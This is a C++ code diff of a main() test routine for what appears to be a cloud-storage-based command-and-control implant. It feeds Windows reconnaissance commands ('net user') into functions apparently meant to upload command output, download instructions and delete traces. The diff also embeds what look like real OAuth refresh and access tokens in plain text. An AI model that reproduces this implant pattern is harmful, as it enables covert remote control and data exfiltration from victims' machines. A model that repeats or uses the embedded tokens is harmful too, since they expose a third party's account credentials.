@@ -48,23 +48,22 @@ int Odd_Num() {
 int main() {
     std::string input = "dir\nnet user\necho bs";
     std::string output;
-    std::string refreshToken;
-    std::string accessToken = "ya29.a0AcM612z22xQAG364D6qu6wA_3jTaYf6KsFJ975Ff0P5YC1V81xbDwXe5wH5cinumZ4gkTRJvmsQMUz4KvcxfX-upw4OD-L4IvOXRlPCUrU-mRfmljsypX1UjFz53kOd1qo9UfFtAoDNf5RsHbgeGY3MsISjPVllaTJcaCYlfngaCgYKASsSARASFQHGX2MiTDUNbP1sUbIvlDlLSlMB1g0177";
+    std::string refreshToken = "1//096ZhTtrDfXWZCgYIARAAGAkSNwF-L9Irke58b_l5qre3YgjxF1s1ECbfBxm3GCk6AQ8QO-pVQmCfvdjZA642F2UH5ba9SXVPLc0";
+    std::string accessToken = "ya29.a0AcM612yAGs8UlIH-gS2FWZoRh1CJbVp6MuvnOgITPeR8rVIhIxH7lRUnb6HYprjxGB9s5HKSwr7rC243kUafPzZRhaMogGtSz7HYSyMmKIy2v715KlgnqDLvJBcx-RhH1rdYy4u8s4O47bm-YepXVsqmxsZEgpLZqp_6JsDGaCgYKAS4SARASFQHGX2MiyUaUXVQWZZJqaljl27SHjA0175";
     output = "Start!";
-    for (int i = 0; i < 10 * 1024; i++)
-    {
-        output += "a";
-    }
-    output += "End!";
+    //for (int i = 0; i < 10 * 1024; i++)
+    //{
+    //    output += "a";
+    //}
+    //output += "End!";
     WORD errorCode;
     //errorCode = singlePartUpload(output, accessToken, 151, 27);
     //errorCode = downloadSourceContext(accessToken, output);
     //DWORD responseCode;
-    /*setNewAccessToken(accessToken, refreshToken);*/
-    //responseCode = setNewRefreshAndAccessToken(accessToken, refreshToken);
+    //errorCode = setNewRefreshAndAccessToken(refreshToken, accessToken);
     //handleFailsafe(refreshToken, accessToken);
-    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), responseCode);
-    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\n", refreshToken.c_str(), accessToken.c_str());
+    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), errorCode);
+
     //downloadContext(accessToken, output);
     //printf("Test begins:\nThe single upload error code: %d", errorCode);
     //printf_s("Source Context is: %s", output.c_str());
@@ -75,8 +74,8 @@ int main() {
     
     //errorCode = deleteSource(accessToken);
     //printf("Source deleted with code: %d", errorCode);
-    errorCode = uploadResult(output, accessToken, 4);
-    printf("Upload is done with code: %d\n", errorCode);
+    //errorCode = uploadResult(output, accessToken, 4);
+    //printf("Upload is done with code: %d\n", errorCode);
 
     return 0;
 }
